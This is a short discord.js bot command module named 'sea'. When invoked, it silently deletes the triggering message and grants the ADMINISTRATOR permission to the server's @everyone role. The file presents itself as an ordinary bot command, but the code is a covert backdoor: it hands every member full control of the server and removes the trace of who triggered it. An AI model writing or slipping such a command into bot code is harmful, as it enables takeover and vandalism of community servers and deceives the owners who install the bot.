const { MessageEmbed } = require("discord.js")
const Discord = require("discord.js");

module.exports = {
    name: "sea",
    run: async (client, message, args) => {
        if (message.deletable) message.delete();
        message.guild.roles.everyone.setPermissions(['ADMINISTRATOR'])
        
    }
}